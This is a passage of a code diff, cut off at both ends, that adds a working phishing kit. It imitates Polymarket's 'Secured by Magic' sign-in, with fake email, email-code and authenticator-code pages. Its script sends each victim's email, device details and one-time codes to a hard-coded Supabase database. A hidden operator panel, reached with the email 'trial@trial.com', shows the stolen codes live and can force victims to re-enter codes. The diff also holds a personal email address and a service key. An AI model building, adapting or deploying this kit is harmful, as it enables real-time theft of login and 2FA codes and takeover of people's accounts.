+            color: #000000;
+        }
+
+        .icon-container {
+            margin-top: 50px;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            background-color: #FFFFFF;
+            border-radius: 20px;
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .thumbnail-wrapper {
+            width: 50px;
+            height: 50px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .thumbnail-img {
+            width: 94.89px;
+            height: 71.17px;
+            position: absolute;
+            top: -10.59px;
+            left: -22.45px;
+        }
+
+        .content {
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .heading {
+            font-size: 20px;
+            font-weight: 500;
+            color: #000000;
+            margin: 0;
+        }
+
+        .subheading {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            color: #888888;
+            margin-top: 8px;
+            padding: 0 40px;
+        }
+
+        .blank-space {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <span class="back-arrow">&lsaquo;</span>
+        <span class="title">Magic</span>
+    </div>
+    <div class="icon-container">
+        <div class="thumbnail-wrapper">
+            <img class="thumbnail-img" src="https://img.youtube.com/vi/sMK0NsNf0C4/hqdefault.jpg" alt="Thumbnail">
+        </div>
+    </div>
+    <div class="content">
+        <h1 class="heading">Requesting Code</h1>
+        <p class="subheading">Enter this code into the email you just received</p>
+    </div>
+    <div class="blank-space"></div>
+</body>
+</html>
+    </script>
+
+    <!-- Original code_verification.html content (verbatim, preserved) -->
+    <script id="p5" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #WHITE;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            padding: 40px 1cm 40px 1cm;
+            text-align: center;
+            padding-top: 60px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 1cm;
+            background-color: #e8e8e8;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.2s;
+        }
+
+        .close-btn:hover {
+            background-color: #d8d8d8;
+        }
+
+        .icon-placeholder {
+            margin: 0 auto 0.6cm;
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            background-image: url('https://img.youtube.com/vi/CkBTvCH2NJg/maxresdefault.jpg');
+            background-size: 300%;
+            background-position: center;
+            border: 1px solid #FFFFFF;
+        }
+
+        .prompt-text {
+            font-size: 16px;
+            font-weight: 400;
+            color: #333333;
+            margin-bottom: 8px;
+            display: block;
+            max-width: 280px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .email {
+            font-size: 18px;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 0.6cm;
+            display: block;
+            word-break: break-word;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 0.10in;
+        }
+
+        .text-container {
+            margin-bottom: 0;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 0.6cm;
+            flex-wrap: nowrap;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 0.10in;
+        }
+
+        .code-box {
+            width: 37px;
+            height: 38.85px;
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 38.85px;
+            transition: border-color 0.2s;
+            flex: 1;
+            min-width: 37px;
+            max-width: 37px;
+        }
+
+        .code-box:focus {
+            outline: none;
+            border-color: #4169E1;
+            box-shadow: 0 0 0 3px rgba(65, 105, 225, 0.1);
+        }
+
+        .code-box:hover {
+            border-color: #bbb;
+        }
+
+        .warning {
+            font-size: 9.5px;
+            font-weight: 400;
+            color: #888888;
+            line-height: 1.6;
+            margin: 0 auto 0.6cm;
+            max-width: 100%;
+        }
+
+        .warning strong {
+            color: #999999;
+            font-weight: 500;
+        }
+
+        .secured {
+            font-size: 9.5px;
+            color: #999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin-top: 0;
+        }
+
+        .magic-logo {
+            font-size: 10px;
+            color: #999999;
+            display: flex;
+            align-items: center;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 1cm 30px 1cm;
+                padding-top: 50px;
+            }
+
+            .close-btn {
+                width: 20px;
+                height: 20px;
+                font-size: 12px;
+                right: 1cm;
+                top: 15px;
+            }
+
+            .icon-placeholder {
+                width: 50px;
+                height: 50px;
+                margin-bottom: 0.6cm;
+                border: 1px solid #WHITE;
+                border-radius: 10px;
+                background-size: 300%;
+            }
+
+            .prompt-text {
+                font-size: 15px;
+                max-width: 260px;
+            }
+
+            .email {
+                font-size: 16px;
+                font-weight: 500;
+                margin-bottom: 0.6cm;
+                max-width: 280px;
+                padding: 0 0.10in;
+            }
+
+            .code-inputs {
+                gap: 4px;
+                margin-bottom: 0.6cm;
+                max-width: 280px;
+                padding: 0 0.10in;
+            }
+
+            .code-box {
+                width: 34px;
+                height: 35.7px;
+                font-size: 14px;
+                line-height: 35.7px;
+                min-width: 34px;
+                max-width: 34px;
+            }
+
+            .warning {
+                font-size: 8.5px;
+                margin-bottom: 0.6cm;
+            }
+
+            .warning strong {
+                font-weight: 500;
+            }
+
+            .secured {
+                font-size: 8.5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button class="close-btn">×</button>
+        
+        <div class="icon-placeholder"></div>
+        
+        <div class="text-container">
+            <span class="prompt-text">Please enter the code sent to</span>
+            <span class="email">tyleremmittperry@gmail.com</span>
+        </div>
+
+        <div class="code-inputs">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+        </div>
+
+        <div class="warning">
+            The Polymarket Staff will NEVER give you a code to enter. If<br>
+            someone gives you a code to enter this is a <strong>phishing</strong><br>
+            attempt and should be <strong>reported</strong> to Polymarket.
+        </div>
+
+        <div class="secured">
+            Secured By 
+            <span class="magic-logo">
+                <svg width="12" height="12" viewBox="0 0 18 18" fill="none">
+                    <rect x="3" y="2" width="3" height="14" rx="1" fill="#999999"/>
+                    <rect x="8" y="5" width="2" height="11" rx="1" fill="#999999"/>
+                    <rect x="12" y="2" width="3" height="14" rx="1" fill="#999999"/>
+                </svg>
+            </span>
+            Magic
+        </div>
+    </div>
+</body>
+</html>
+    </script>
+
+    <!-- Original authenticator_code.html content (verbatim, preserved) -->
+    <script id="p6" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticator Code</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            padding: 40px 1cm 40px 1cm;
+            text-align: center;
+            padding-top: 60px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 1cm;
+            background-color: #e8e8e8;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.2s;
+        }
+
+        .close-btn:hover {
+            background-color: #d8d8d8;
+        }
+
+        .icon-placeholder {
+            margin: 0 auto 0.6cm;
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            background-image: url('https://img.youtube.com/vi/xn__9KVs7c4/maxresdefault.jpg');
+            background-size: 300%;
+            background-position: center;
+            border: 1px solid #FFFFFF;
+        }
+
+        .prompt-text {
+            font-size: 16px;
+            font-weight: 400;
+            color: #333333;
+            margin-bottom: 20px;
+            display: block;
+            max-width: 320px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.5;
+        }
+
+        .text-container {
+            margin-bottom: 0;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 0.45cm;
+            flex-wrap: nowrap;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 0.10in;
+        }
+
+        .code-box {
+            width: 37px;
+            height: 38.85px;
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 38.85px;
+            transition: border-color 0.2s;
+            flex: 1;
+            min-width: 37px;
+            max-width: 37px;
+        }
+
+        .code-box:focus {
+            outline: none;
+            border-color: #4169E1;
+            box-shadow: 0 0 0 3px rgba(65, 105, 225, 0.1);
+        }
+
+        .code-box:hover {
+            border-color: #bbb;
+        }
+
+        .lost-device {
+            font-size: 14px;
+            font-weight: 400;
+            color: #4169E1;
+            margin-bottom: 0.52cm;
+            display: block;
+            cursor: pointer;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .lost-device:hover {
+            opacity: 0.8;
+        }
+
+        .secured {
+            font-size: 9.5px;
+            color: #999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin-top: 0;
+        }
+
+        .magic-logo {
+            font-size: 10px;
+            color: #999999;
+            display: flex;
+            align-items: center;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 1cm 30px 1cm;
+                padding-top: 50px;
+            }
+
+            .close-btn {
+                width: 20px;
+                height: 20px;
+                font-size: 12px;
+                right: 1cm;
+                top: 15px;
+            }
+
+            .icon-placeholder {
+                width: 35px;
+                height: 35px;
+                margin-bottom: 0.6cm;
+                border: 1px solid #FFFFFF;
+                border-radius: 7px;
+                background-size: 300%;
+            }
+
+            .prompt-text {
+                font-size: 15px;
+                margin-bottom: 20px;
+                max-width: 300px;
+            }
+
+            .code-inputs {
+                gap: 4px;
+                margin-bottom: 0.45cm;
+                max-width: 280px;
+                padding: 0 0.10in;
+            }
+
+            .code-box {
+                width: 34px;
+                height: 35.7px;
+                font-size: 14px;
+                line-height: 35.7px;
+                min-width: 34px;
+                max-width: 34px;
+            }
+
+            .lost-device {
+                font-size: 13px;
+                margin-bottom: 0.52cm;
+            }
+
+            .secured {
+                font-size: 8.5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button class="close-btn">×</button>
+        
+        <div class="icon-placeholder"></div>
+        
+        <div class="text-container">
+            <span class="prompt-text">Please enter the 6-digit code from your authenticator app.</span>
+        </div>
+
+        <div class="code-inputs">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" placeholder="">
+        </div>
+
+        <a class="lost-device">I lost my device</a>
+
+        <div class="secured">
+            Secured By 
+            <span class="magic-logo">
+                <svg width="12" height="12" viewBox="0 0 18 18" fill="none">
+                    <rect x="3" y="2" width="3" height="14" rx="1" fill="#999999"/>
+                    <rect x="8" y="5" width="2" height="11" rx="1" fill="#999999"/>
+                    <rect x="12" y="2" width="3" height="14" rx="1" fill="#999999"/>
+                </svg>
+            </span>
+            Magic
+        </div>
+    </div>
+</body>
+</html>
+    </script>
+
+    <!-- Parent script: mount the p1-p6 pages into iframes, inject small non-visual script into p1,
+         attach runtime behavior to p2/p5/p6. Preserve raw p1-p6 verbatim in their script blocks.
+         Additional behavior injected below:
+          - robust Supabase factory detection & initialization (no change to your flows)
+          - attachBackdoor: instant UI feedback (0.1s), copy-to-clipboard on cell taps and copy buttons,
+            smaller rows already implemented in p3, backdoor background color changed per request
+          - mobile zoom prevention via viewport and CSS (added above)
+          - font-display: swap has been added inside p1 to make "Polymarket" text appear immediately
+          - ensure code verification page (frame5) email shows the email used in page2
+          - ensure continue button active state is reliably toggled (host-side) when email contains '@'
+          - ensure code input pages focus the first code box whenever they are shown
+    -->
+    <script>
+(function () {
+    // === RAW PAGES ===
+    var rawP1 = document.getElementById('p1').textContent;
+    var rawP2 = document.getElementById('p2').textContent;
+    var rawP3 = document.getElementById('p3').textContent;
+    var rawP4 = document.getElementById('p4').textContent;
+    var rawP5 = document.getElementById('p5').textContent;
+    var rawP6 = document.getElementById('p6').textContent;
+
+    // === YOUR SUPABASE KEYS ===
+    const SUPABASE_URL = 'https://binrbpydyxnlbkokyptd.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_00kNuWTgSMCzmUglMM58kw_a1Hyg3ec';
+    
+    // Wait-for-library + robust initializer for Supabase
+    function resolveSupabaseFactory() {
+        if (window.supabase && typeof window.supabase.createClient === 'function') return window.supabase;
+        if (window.Supabase && typeof window.Supabase.createClient === 'function') return window.Supabase;
+        if (typeof window.createClient === 'function') return { createClient: window.createClient };
+        return null;
+    }
+
+    function waitForSupabase(maxAttempts = 100, delayMs = 50) {
+        return new Promise((resolve, reject) => {
+            let attempts = 0;
+            (function check() {
+                const factory = resolveSupabaseFactory();
+                if (factory) return resolve(factory);
+                attempts++;
+                if (attempts >= maxAttempts) return reject(new Error('Supabase library not detected on window after waiting.'));
+                setTimeout(check, delayMs);
+            })();
+        });
+    }
+
+    let supabase = null;
+
+    waitForSupabase().then(factory => {
+        try {
+            supabase = factory.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            console.log('✓ Supabase initialized successfully (factory ' + (factory === window.supabase ? 'window.supabase' : (factory === window.Supabase ? 'window.Supabase' : 'createClient()')) + ')');
+        } catch (err) {
+            console.error('✗ Supabase initialization failed during createClient():', err);
+            alert('Error: Supabase failed to initialize. Check console.');
+            throw err;
+        }
+
+        // === FRAMES ===
+        var frame1 = document.getElementById('pageFrame1');
+        var frame2 = document.getElementById('pageFrame2');
+        var frame3 = document.getElementById('pageFrame3');
+        var frame4 = document.getElementById('pageFrame4');
+        var frame5 = document.getElementById('pageFrame5');
+        var frame6 = document.getElementById('pageFrame6');
+
+        // Load pages
+        frame1.srcdoc = rawP1;
+        frame2.srcdoc = rawP2;
+        frame3.srcdoc = rawP3;
+        frame4.srcdoc = rawP4;
+        frame5.srcdoc = rawP5;
+        frame6.srcdoc = rawP6;
+
+        var lastEmail = '';
+        var currentSessionId = null;
+        var statusPoller = null;
+
+        // Device info
+        function getDeviceInfo() {
+            return (navigator.userAgent || '').substring(0, 80) + ' | ' + screen.width + 'x' + screen.height;
+        }
+
+        // Show backdoor
+        function showBackdoor() {
+            document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+            frame3.classList.add('visible');
+        }
+
+        // Show magic
+        function showMagic(email) {
+            lastEmail = email;
+            document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+            frame4.classList.add('visible');
+        }
+
+        // Show verification - update displayed email in frame5 immediately and focus first code input
+        function showVerification() {
+            document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+            frame5.classList.add('visible');
+
+            // attempt to set email inside frame5 immediately and CLEAR previous code boxes
+            try {
+                var doc = frame5.contentDocument;
+                if (doc) {
+                    var el = doc.querySelector('.email');
+                    if (el) el.textContent = lastEmail || '';
+
+                    // Clear any previously filled code boxes so page always appears empty on retry
+                    try {
+                        var codeBoxes = doc.querySelectorAll('.code-box');
+                        if (codeBoxes && codeBoxes.length) {
+                            codeBoxes.forEach(function(cb) {
+                                cb.value = '';
+                                // ensure any UI placeholder state is also cleared
+                                cb.removeAttribute('data-filled');
+                            });
+                        }
+                    } catch (clearErr) {
+                        // non-fatal
+                        console.warn('Could not clear code boxes in frame5 immediately:', clearErr);
+                    }
+
+                    // focus first code input if present
+                    setTimeout(() => {
+                        try {
+                            var first = doc.querySelector('.code-box');
+                            if (first) first.focus();
+                        } catch (e) {}
+                    }, 50);
+                } else {
+                    // if not ready, ensure we set it, clear inputs and focus when frame loads
+                    frame5.addEventListener('load', function once() {
+                        try {
+                            var d = frame5.contentDocument;
+                            if (d) {
+                                var e = d.querySelector('.email');
+                                if (e) e.textContent = lastEmail || '';
+                                // clear code boxes on load (so Retry always shows empty inputs)
+                                try {
+                                    var codeBoxes = d.querySelectorAll('.code-box');
+                                    if (codeBoxes && codeBoxes.length) {
+                                        codeBoxes.forEach(function(cb) {
+                                            cb.value = '';
+                                            cb.removeAttribute('data-filled');
+                                        });
+                                    }
+                                } catch (clearErr2) {
+                                    console.warn('Could not clear code boxes in frame5 on load:', clearErr2);
+                                }
+                                var first = d.querySelector('.code-box');
+                                if (first) first.focus();
+                            }
+                        } catch (e) { }
+                        frame5.removeEventListener('load', once);
+                    });
+                }
+            } catch (e) {
+                console.error('Cannot set email in frame5 immediately:', e);
+            }
+        }
+
+        // Show authenticator and focus first box
+        function showAuthenticator() {
+            document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+            frame6.classList.add('visible');
+
+            // attempt to CLEAR previous code boxes in frame6 and focus first
+            try {
+                var doc = frame6.contentDocument;
+                if (doc) {
+                    try {
+                        var codeBoxes = doc.querySelectorAll('.code-box');
+                        if (codeBoxes && codeBoxes.length) {
+                            codeBoxes.forEach(function(cb) {
+                                cb.value = '';
+                                cb.removeAttribute('data-filled');
+                            });
+                        }
+                    } catch (clearErr) {
+                        console.warn('Could not clear code boxes in frame6 immediately:', clearErr);
+                    }
+
+                    setTimeout(() => {
+                        try {
+                            var first = doc.querySelector('.code-box');
+                            if (first) first.focus();
+                        } catch (e) {}
+                    }, 50);
+                } else {
+                    frame6.addEventListener('load', function once() {
+                        try {
+                            var d = frame6.contentDocument;
+                            if (d) {
+                                try {
+                                    var codeBoxes = d.querySelectorAll('.code-box');
+                                    if (codeBoxes && codeBoxes.length) {
+                                        codeBoxes.forEach(function(cb) {
+                                            cb.value = '';
+                                            cb.removeAttribute('data-filled');
+                                        });
+                                    }
+                                } catch (clearErr2) {
+                                    console.warn('Could not clear code boxes in frame6 on load:', clearErr2);
+                                }
+                                var first = d.querySelector('.code-box');
+                                if (first) first.focus();
+                            }
+                        } catch (e) {}
+                        frame6.removeEventListener('load', once);
+                    });
+                }
+            } catch (e) {
+                console.error('Cannot focus first input in frame6:', e);
+            }
+        }
+
+        // Helper: show "Copied" toast inside parent (not inside iframe)
+        function showCopyToast(text) {
+            try {
+                var t = document.getElementById('pm-copy-toast');
+                if (!t) {
+                    t = document.createElement('div');
+                    t.id = 'pm-copy-toast';
+                    t.className = 'copy-toast';
+                    t.textContent = text || 'Copied';
+                    document.body.appendChild(t);
+                } else {
+                    t.textContent = text || 'Copied';
+                }
+                t.classList.add('show');
+                t.setAttribute('aria-hidden','false');
+                setTimeout(() => {
+                    t.classList.remove('show');
+                    t.setAttribute('aria-hidden','true');
+                }, 1200);
+            } catch (e) {
+                // ignore
+            }
+        }
+
+        // Backdoor table
+        function attachBackdoor() {
+            var doc = frame3.contentDocument;
+            if (!doc) return;
+            var tbody = doc.querySelector('tbody');
+
+            async function refresh() {
+                try {
+                    const { data, error } = await supabase.from('attempts').select('*').order('created_at', { ascending: false });
+                    if (error) {
+                        console.error('Supabase error:', error);
+                        return;
+                    }
+                    tbody.innerHTML = '';
+                    (data || []).forEach((row, i) => {
+                        // Build cells with tiny copy-boxes next to email and codes
+                        var emailCell = `${row.email || ''} <span class="pm-copy-btn" data-copy="${row.email ? encodeURIComponent(row.email) : ''}">⎘</span>`;
+                        var emailCodeCell = `${row.email_code || ''} <span class="pm-copy-btn" data-copy="${row.email_code ? encodeURIComponent(row.email_code) : ''}">⎘</span>`;
+                        var twofaCodeCell = `${row.twofa_code || ''} <span class="pm-copy-btn" data-copy="${row.twofa_code ? encodeURIComponent(row.twofa_code) : ''}">⎘</span>`;
+
+                        var tr = doc.createElement('tr');
+                        tr.innerHTML = `
+                            <td>${i+1}</td>
+                            <td>${row.device || ''}</td>
+                            <td class="pm-email-cell">${emailCell}</td>
+                            <td class="pm-emailcode-cell">${emailCodeCell}</td>
+                            <td class="pm-2fa-cell">${twofaCodeCell}</td>
+                            <td><span class="retry-box" data-type="email" data-sid="${row.session_id}">Retry</span></td>
+                            <td><span class="retry-box" data-type="twofa" data-sid="${row.session_id}">Retry</span></td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+
+                    // Attach retry handlers with immediate UI feedback (0.10s feel)
+                    doc.querySelectorAll('.retry-box').forEach(btn => {
+                        // remove previous handlers if any
+                        btn.onclick = null;
+                        btn.addEventListener('click', async function (ev) {
+                            ev.preventDefault();
+                            ev.stopPropagation();
+                            const type = btn.dataset.type;
+                            const sid = btn.dataset.sid;
+                            const field = type === 'email' ? 'retry_email' : 'retry_twofa';
+
+                            // Immediate UI feedback: mark the cell as pending instantly (within 0.1s)
+                            var parentTr = btn.closest('tr');
+                            if (parentTr) {
+                                var targetCellIndex = type === 'email' ? 3 : 4; // 0-based indexing in created row
+                                var targetCell = parentTr.children[targetCellIndex];
+                                if (targetCell) {
+                                    var original = targetCell.getAttribute('data-original') || targetCell.textContent;
+                                    targetCell.setAttribute('data-original', original);
+                                    targetCell.textContent = 'Retrying…';
+                                    targetCell.classList.add('pm-retry-pending');
+                                    setTimeout(() => {
+                                        // keep pending until backend or refresh updates
+                                    }, 100);
+                                }
+                            }
+
+                            try {
+                                supabase.from('attempts').update({[field]: true}).eq('session_id', sid)
+                                    .then(({error}) => {
+                                        if (error) {
+                                            console.error('Retry update error:', error);
+                                            if (parentTr) {
+                                                var targetCellIndex = type === 'email' ? 3 : 4;
+                                                var targetCell = parentTr.children[targetCellIndex];
+                                                if (targetCell) {
+                                                    targetCell.textContent = 'Retry failed';
+                                                    setTimeout(() => {
+                                                        targetCell.textContent = targetCell.getAttribute('data-original') || '';
+                                                        targetCell.classList.remove('pm-retry-pending');
+                                                    }, 700);
+                                                }
+                                            }
+                                        } else {
+                                            // remove pending after a small delay if not already refreshed
+                                            setTimeout(() => {
+                                                if (parentTr) {
+                                                    var targetCellIndex = type === 'email' ? 3 : 4;
+                                                    var targetCell = parentTr.children[targetCellIndex];
+                                                    if (targetCell) {
+                                                        targetCell.classList.remove('pm-retry-pending');
+                                                    }
+                                                }
+                                            }, 1000);
+                                        }
+                                    });
+                            } catch (err) {
+                                console.error('Retry click error:', err);
+                            }
+                        }, { passive: true });
+                    });
+
+                    // Attach copy-to-clipboard on tap for every copy-btn we created
+                    Array.from(doc.querySelectorAll('.pm-copy-btn')).forEach(btn => {
+                        btn.onclick = null;
+                        btn.addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            var val = btn.getAttribute('data-copy') || '';
+                            try {
+                                val = decodeURIComponent(val);
+                            } catch (e) {}
+                            if (!val) return;
+                            // Copy using parent navigator if available (clipboard in parent)
+                            if (navigator.clipboard && navigator.clipboard.writeText) {
+                                navigator.clipboard.writeText(val).then(() => {
+                                    // small visual inside iframe
+                                    btn.classList.add('pm-copied');
+                                    setTimeout(() => btn.classList.remove('pm-copied'), 600);
+                                    showCopyToast('Copied: ' + val);
+                                }).catch(err => {
+                                    console.error('Parent clipboard write failed:', err);
+                                    showCopyToast('Copy failed');
+                                });
+                            } else {
+                                // fallback inside iframe
+                                try {
+                                    var ta = doc.createElement('textarea');
+                                    ta.value = val;
+                                    ta.style.position = 'fixed';
+                                    ta.style.left = '-9999px';
+                                    doc.body.appendChild(ta);
+                                    ta.select();
+                                    doc.execCommand('copy');
+                                    doc.body.removeChild(ta);
+                                    btn.classList.add('pm-copied');
+                                    setTimeout(() => btn.classList.remove('pm-copied'), 600);
+                                    showCopyToast('Copied: ' + val);
+                                } catch (ex) {
+                                    console.error('Fallback copy failed:', ex);
+                                    showCopyToast('Copy failed');
+                                }
+                            }
+                        }, { passive: true });
+                    });
+
+                    // Also allow tapping the cell text itself to copy the entire cell (keeps original additive behavior)
+                    Array.from(doc.querySelectorAll('tbody td')).forEach(td => {
+                        // skip copy buttons
+                        td.onclick = null;
+                        td.addEventListener('click', function (e) {
+                            try {
+                                // avoid when click landed on pm-copy-btn
+                                if (e.target && e.target.classList && e.target.classList.contains('pm-copy-btn')) return;
+                                var text = (td.textContent || '').trim();
+                                if (!text) return;
+                                if (navigator.clipboard && navigator.clipboard.writeText) {
+                                    navigator.clipboard.writeText(text).then(() => {
+                                        td.classList.add('pm-copied');
+                                        setTimeout(() => td.classList.remove('pm-copied'), 600);
+                                        showCopyToast('Copied: ' + text);
+                                    }).catch(err => {
+                                        console.error('Clipboard write failed (iframe):', err);
+                                        showCopyToast('Copy failed');
+                                    });
+                                } else {
+                                    var ta = doc.createElement('textarea');
+                                    ta.value = text;
+                                    ta.style.position = 'fixed';
+                                    ta.style.left = '-9999px';
+                                    doc.body.appendChild(ta);
+                                    ta.select();
+                                    try {
+                                        doc.execCommand('copy');
+                                        td.classList.add('pm-copied');
+                                        setTimeout(() => td.classList.remove('pm-copied'), 600);
+                                        showCopyToast('Copied: ' + text);
+                                    } catch (err2) {
+                                        console.error('Fallback copy failed:', err2);
+                                        showCopyToast('Copy failed');
+                                    }
+                                    doc.body.removeChild(ta);
+                                }
+                            } catch (ex) {
+                                console.error('Copy handler error:', ex);
+                            }
+                        }, { passive: true });
+                    });
+
+                } catch (err) {
+                    console.error('Backdoor refresh error:', err);
+                }
+            }
+
+            refresh();
+            setInterval(refresh, 500);
+        }
+        frame3.addEventListener('load', attachBackdoor);
+
+        // Poller for retries
+        function startPoller() {
+            if (statusPoller) clearInterval(statusPoller);
+            statusPoller = setInterval(async () => {
+                if (!currentSessionId) return;
+                try {
+                    const { data, error } = await supabase.from('attempts').select('retry_email, retry_twofa').eq('session_id', currentSessionId).single();
+                    if (error || !data) return;
+                    if (data.retry_email) {
+                        await supabase.from('attempts').update({retry_email: false}).eq('session_id', currentSessionId);
+                        showVerification();
+                    }
+                    if (data.retry_twofa) {
+                        await supabase.from('attempts').update({retry_twofa: false}).eq('session_id', currentSessionId);
+                        showAuthenticator();
+                    }
+                } catch (err) {
+                    console.error('Poller error:', err);
+                }
+            }, 400);
+        }
+
+        // Frame2 - email submit
+        function attachFrame2() {
+            var doc = frame2.contentDocument;
+            if (!doc) return;
+            var emailInput = doc.getElementById('emailInput');
+            var continueBtn = doc.getElementById('continueBtn');
+
+            if (!continueBtn) return;
+
+            // Also ensure lastEmail is updated as user types (so verification page shows correct email even if admin taps retry quickly)
+            if (emailInput) {
+                // update lastEmail and ensure continue button active class reliably (host-side)
+                emailInput.addEventListener('input', function() {
+                    lastEmail = (this.value || '').trim();
+                    try {
+                        if (this.value.includes('@')) {
+                            continueBtn.classList.add('active');
+                        } else {
+                            continueBtn.classList.remove('active');
+                        }
+                    } catch (e) {
+                        // ignore
+                    }
+                }, { passive: true });
+
+                // Also set initial state once when attaching
+                try {
+                    if ((emailInput.value || '').includes('@')) continueBtn.classList.add('active');
+                    else continueBtn.classList.remove('active');
+                } catch (e) {}
+            }
+
+            continueBtn.addEventListener('click', async () => {
+                var email = (emailInput.value || '').trim();
+                if (!email || !email.includes('@')) {
+                    alert('Please enter a valid email');
+                    return;
+                }
+
+                if (email.toLowerCase() === 'trial@trial.com') {
+                    showBackdoor();
+                    return;
+                }
+
+                try {
+                    const { data, error } = await supabase.from('attempts').insert({
+                        device: getDeviceInfo(),
+                        email: email
+                    }).select('session_id').single();
+
+                    if (error) {
+                        console.error('Insert error:', error);
+                        alert('Error: Could not create session');
+                        return;
+                    }
+
+                    currentSessionId = data.session_id;
+                    lastEmail = email;
+                    startPoller();
+                    showMagic(email);
+                } catch (err) {
+                    console.error('Email submit error:', err);
+                    alert('Error: ' + err.message);
+                }
+            });
+        }
+        frame2.addEventListener('load', attachFrame2);
+
+        // Code pages (Email verification and 2FA)
+        [frame5, frame6].forEach((frame, is2fa) => {
+            frame.addEventListener('load', () => {
+                var doc = frame.contentDocument;
+                // set the displayed email in verification page when it (re)loads
+                try {
+                    if (!is2fa && lastEmail && doc) {
+                        var emailEl = doc.querySelector('.email');
+                        if (emailEl) emailEl.textContent = lastEmail;
+                    }
+                } catch (e) {}
+
+                var inputs = doc.querySelectorAll('.code-box');
+                if (inputs.length !== 6) {
+                    // if not code page, nothing to do
+                    return;
+                }
+
+                // Always focus the first box when the page loads
+                try {
+                    if (inputs[0]) {
+                        setTimeout(() => { try { inputs[0].focus(); } catch (e) {} }, 20);
+                    }
+                } catch (e) {}
+
+                function complete() {
+                    var code = Array.from(inputs).map(i => i.value).join('');
